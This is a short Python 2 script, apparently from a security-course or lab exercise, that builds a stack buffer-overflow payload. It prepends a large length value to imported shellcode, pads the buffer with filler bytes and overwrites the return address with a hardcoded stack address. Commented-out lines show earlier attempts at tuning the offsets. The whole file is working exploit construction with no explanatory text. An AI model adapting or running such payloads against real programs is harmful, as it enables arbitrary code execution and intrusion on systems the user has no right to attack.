from shellcode import shellcode
from struct import pack
import sys

#print shellcode + '\x61'*89 + pack('<I', 0xbffeeadc)

def eb(s):
	"""Justifies a string number to eight bits"""
	return s.ljust(8,'0')

#s = bytearray.fromhex(eb("64"))
#s = str(s) + '\x61'*89 + pack('<I', 0xbffeeadc)
#sys.stdout.write(s)


# Get the memlocation of buf and eip
#s = bytearray.fromhex(eb("03") + eb("01") + eb("02") + eb("03"))
#s = bytearray.fromhex("FFFFFFEC") 
#s = str(bytearray.fromhex("BC02000000000000"))
#s = str(bytearray.fromhex("17000000"))
#s += shellcode
#s += "\x61" * 704
#s += pack('<I', 0xbffeeb00)
#sys.stdout.write(s)

s = ''

s += pack('<I', 0x40000000) #str(bytearray.fromhex('40000001'))
s += shellcode
s += '\x61' * abs(len(shellcode) - 60)
s += pack('<I', 0xbffeeb10)


sys.stdout.write(s)
